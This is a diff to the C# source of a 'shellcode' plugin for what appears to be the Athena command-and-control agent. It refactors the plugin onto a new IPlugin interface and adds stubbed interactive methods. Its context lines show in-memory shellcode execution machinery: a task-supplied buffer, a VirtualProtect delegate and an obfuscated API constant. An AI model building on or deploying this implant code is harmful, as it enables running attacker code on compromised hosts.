@@ -8,12 +8,16 @@ using Athena.Utilities;
 using Athena.Models;
 using Athena.Commands;
 using Athena.Models.Responses;
+using Athena.Models.Comms.Tasks;
 
 namespace Plugins
 {
-    public class ShellcodeExec : AthenaPlugin
+    public class ShellcodeExec : IPlugin
     {
-        public override string Name => "shellcode";
+        public string Name => "shellcode";
+
+        public bool Interactive => false;
+
         private delegate void BufferDelegate();
         private enum MemoryProtection : UInt32
         {
@@ -32,7 +36,7 @@ namespace Plugins
         const long VirtPro = 65467780416196;
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        public override void Execute(Dictionary<string, string> args)
+        public void Start(Dictionary<string, string> args)
         {
             byte[] buffer;
             if (args.ContainsKey("buffer"))
@@ -110,6 +114,21 @@ namespace Plugins
                 task_id = args["task-id"],
                 status = "success"
             });
+        }
+
+        public void Interact(InteractiveMessage message)
+        {
+            throw new NotImplementedException();
+        }
+
+        public void Stop(string task_id)
+        {
+            throw new NotImplementedException();
+        }
+
+        public bool IsRunning()
+        {
+            throw new NotImplementedException();
         }
     }
 }
